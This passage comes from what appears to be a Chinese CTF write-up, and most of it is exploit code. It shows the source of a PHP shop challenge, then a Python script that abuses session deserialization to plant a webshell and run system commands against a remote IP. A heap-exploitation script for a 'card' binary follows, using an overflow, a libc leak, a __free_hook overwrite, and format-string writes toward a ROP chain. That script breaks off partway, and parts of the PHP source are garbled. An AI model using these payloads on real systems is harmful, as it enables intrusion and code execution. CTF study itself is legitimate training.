        }
        public function 思考($货物) {
            $this->贡品=$货物;
            if(file_exists($this->朝拜圣地.'/sess_'.$货物)) {
                unlink($this->朝拜圣地.'/sess_'.$货物);
            }
            return true;
        }
        public function 反省($货物) {
            foreach(glob($this->朝拜圣地.'/*') as $元素) {
                if(filemtime($元素) + $货物 总结($this->归纳());
        }
    }
    $齿轮 = new 造齿轮();
    // 设置处理 Session 的 Handler
    session_set_save_handler(array($齿轮,'挖掘'),array($齿轮,'完毕'),array($齿轮,'收获'),array($齿轮,'种植'),array($齿轮,'反省'),array($齿轮,'完毕'));
    session_start();
    srand(mktime(0,0,0,0,0,0));
    $盛世=array(rand()=>array('alice',0b1),rand()=>array('bob',0b101),rand()=>array('cat',0b10100),rand()=>array('dog',0b1111),rand()=>array('evil',0b101),rand()=>array('flag',0b10011100001111));
    function 化缘() {
        return $_SESSION['balance'];
    }
    function 取经() {
        global$盛世;
        $宝藏='[';
        foreach($_SESSION['items'] as $元素){
            $宝藏 .= $盛世[$元素][0].', ';
        }
        $宝藏.=']';
        return $宝藏;
    }
    function 念经() {
        global $齿轮;
        return $齿轮->归纳();
    }
    function 造世() {
        global $盛世;
        $宝藏='';
        foreach($盛世 as $按键=>$元素){
            $宝藏 .=
            ''.
                $元素[0].
            'buy ($'.$元素[1].')';
        }
        return $宝藏;
    }
    if(!isset($_SESSION['balance'])){
        $_SESSION['balance'] = 0b1000101110010/2;
    }
    if(!isset($_SESSION['items'])){
        $_SESSION['items'] = [];
    }
    if(!isset($_SESSION['note'])){
        $_SESSION['note'] = '';
    };
    if(isset($_POST['id'])) {
        if($_SESSION['balance'] >= $盛世[$_POST['id']][1]) {
            $_SESSION['balance'] = $_SESSION['balance']-$盛世[$_POST['id']][1];
            array_push($_SESSION['items'], $_POST['id']);
            echo('buy succ!');
        } else {
            echo('lack of balance!');
        }
    }
    if(isset($_POST['note'])) {
        if(strlen($_POST['note'])总结(str_replace(array('&',''), array('&amp;','&lt;','"&gt;'), $_POST['note']));
            echo('write succ!');
        } else {
            echo('note too long!');
        }
    }
    ?>
可以看到即使我们购买了 flag，也只是修改了下 session 而已，因此猜测可能需要写 Shell。
在解析 Session 时，会对 Session 进行反序列化，如果能写 Session
文件，则可以反序列化`造齿轮`类，执行析构函数的时候写的文件名`$this->圣殿`可控，可写入`.php`文件。
  1. 构造 Session 
        总结($this->归纳());`写 Shell，其中 Shell 的内容需要从`storage`下的文件中读取。  
题目中对`note`的内容做了过滤，替换了`` `&`这几个字符，因此我们尝试将 Shell 写入`sess_`文件。当然可以用上面第二步中写
Session 文件的办法，不过更简单的办法是在购买商品页面，将购买商品的 `id` 的内容修改成我们的 Shell，然后点击购买，这样这个 `id`
下标会被写入 Session 中。  
这里将 Cookie 改为`PHPSESSID=e99shell`，购买商品时修改
id，即可创建文件`storage/sess_e99shell`。之后反序列化时读取此文件内容，再写文件即可。
exp:
    import requests
    import binascii
    import base64
    url = 'http://119.3.111.239:8010'
    # 1. get a php session id, create the sess_ file.
    resp = requests.get(url)
    cookie = requests.utils.dict_from_cookiejar(resp.cookies)
    php_sessid = cookie['PHPSESSID']
    # 2. write the session.
    payload = b'YXxPOjk6IumAoOm9v+i9riI6NDp7czoxNToiACoA5pyd5ouc5Zyj5ZywIjtzOjc6InN0b3JhZ2UiO3M6OToiACoA6LSh5ZOBIjtzOjMxOiJub3RfZXhpc3RfZmlsZS8uLi9zZXNzX2U5OXNoZWxsIjtzOjk6IgAqAOWco+auvyI7czo5OiJlOTluYi5waHAiO3M6OToiACoA56aB5ZywIjtzOjA6IiI7fQ=='
    requests.post(url, data={
        'note': base64.b64decode(payload)
    }, headers={'Cookie': 'PHPSESSID=' + php_sessid + '/../sess_e99e99e99'})
    # 3. write shell content.
    requests.post(url, data={
        'id': ''
    }, headers={'Cookie': 'PHPSESSID=e99shell'})
    # 4. write the shell.
    requests.get(url, headers={'Cookie': 'PHPSESSID=e99e99e99'})
    # 5. done!
    resp = requests.post(url + '/storage/note_e99nb.php', data={
        'cardinal': "system('cat /flag');"
    })
    print(resp.text)
## pwn
###  card
禁用了execve
有普通的edit和隐藏的edit，隐藏的edit是直接read
普通的edit是先read，然后strcpy，可以溢出
      __asm { endbr64 }
      memset(src, 0, (int)a2);
      read(0, src, a2);
      return strcpy(a1, src);
这里只memset了对应的size，如果之前多写了一些就不会被置零，后面strcpy也会被copy进去，所以可以越界写
先越界改chunk的size字段，造成chunk overlap，然后利用切割unsorted
bin的main_arena，爆破得到_IO_2_1_stdout，修改_IO_write_base的低字节，leak出libc
然后改__free_hook为printf，利用格式化字符串在栈上布局好栈迁移的ROP，最后栈迁移到bss段进行ORW
exp(数据量很大，远程要跑很久):
    #coding=utf8
    from PwnContext import *
    context.terminal = ['xfce4-terminal', '--tab', '-x', 'zsh', '-c']
    context.log_level = 'info'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096,timeout=2:ctx.recv(numb, timeout=timeout)
    ru      = lambda delims,timeout=2, drop=True  :ctx.recvuntil(delims, drop, timeout=timeout)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\x00'))
    uu64    = lambda data   :u64(data.ljust(8, '\x00'))
    leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
    ctx.binary = './card'
    ctx.remote = ('119.3.154.59', 9777)
    #ctx.custom_lib_dir = './'
    ctx.remote_libc = './libc.so.6'
    ctx.debug_remote_libc = True
    def add(sz):
        sla('Choice:', '1')
        sla('Size: ', str(sz))
    def edit(idx, content):
        sla('Choice:', '2')
        sla('Index: ', str(idx))
        sa('Message: ', content)
    def free(idx):
        sla('Choice:', '3')
        sla('Index: ', str(idx))
    def raw_edit(idx, content):
        sla('Choice:', '5')
        sla('Index: ', str(idx))
        sa('Message: ', content)
    #rs()
    while True:
        try:
            rs('remote')
            #rs()
            add(0x18) # 0
            add(0x50) # 1
            add(0x60) # 2
            add(0x60) # 3
            add(0x70) # 4
            add(0x70) # 5
            add(0x80) # 6
            add(0x80) # 7
            add(0x90) # 8
            add(0x90) # 9
            add(0x10) # 10
            edit(1, b'a' * 0x18 + p64(0x60 + 0x70 * 2 + 0x80 * 2 + 0x90 * 2 + 0xa0 * 2 + 1))
            edit(0, b'a' * 0x18)
            free(3)
            free(2)
            free(1)
            add(0x50) # 1
            add(0x430) # 2
            # leak libc
            raw_edit(2, '\xa0\xd6')
            add(0x60) # 3
            add(0x60) # 11
            raw_edit(11, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
            sleep(0.1)
            ru('\x00' * 8)
            lbase = u64(r(8)) - (0x7ffff7fc0980 - 0x7ffff7dd5000)
            leak('lbase', lbase)
            if (lbase & 0x700000000000) != 0x700000000000:
                raise EOFError()
            break
        except KeyboardInterrupt:
            exit()
        except EOFError:
            continue
    __free_hook = lbase + ctx.libc.sym['__free_hook']
    add(0x18)#12
    add(0x18)#13
    add(0x1f8)#14
    add(0x1f8)#15
    edit(14,b'a'*0x18+p64(0x221))
    edit(12,'a'*0x18)
    free(13)
    free(15)
    free(14)
    add(0x218)#13
    edit(13,b'a'*8*4+p64(__free_hook))
    edit(13,'a'*(8*3+7))
    edit(13,'a'*(8*3+6))
    edit(13,'a'*(8*3+5))
    edit(13,'a'*(8*3+4))
    edit(13,'a'*(8*3+3))
    edit(13,b'a'*(8*3)+p64(0x201))
    add(0x1f8)#14
    add(0x1f8)#15
    printf = lbase + ctx.libc.sym['printf']
    edit(15, p64(printf))
    idx = 16
    def call_printf(s): 
        add(0x100) # 16
        edit(idx, s)
        free(idx)
        sleep(0.1)
    call_printf("123%30$p%9$p")
    sleep(0.1)
    ru('123')
    stack=int(r(14),16)
    text=int(r(14),16) - (0x5555555558e4-0x555555554000)
    leak('stack', stack)
    leak('text', text)
    call_printf("%{}c%30$hn".format((stack - 0x60) & 0xffff))
    def write_byte(addr, byte):
        # 布置地址
        for i in range(8):
            ref = (stack - 0x60 + i) & 0xff
            if ref > 0:
                call_printf("%{}c%30$hhn".format(ref))
            else:
                call_printf("%30$hhn")
            num = (addr >> (8 * i)) & 0xff
            if num > 0:
                call_printf("%{}c%43$hhn".format(num))
            else:
                call_printf("%43$hhn")
        byte = ord(byte)
        if byte > 0:
            call_printf("%{}c%31$hhn".format(byte))
        else:
            call_printf("%31$hhn")
    def write_content(addr, content):
        for i in range(len(content)):
            write_byte(addr+i, content[i])
    rdi= 0x1963+text
    rsi= 0x1961+text
    rdx= 0x1626d5+lbase
    bss = text + 0x004c60
    leave_ret = text + 0x001869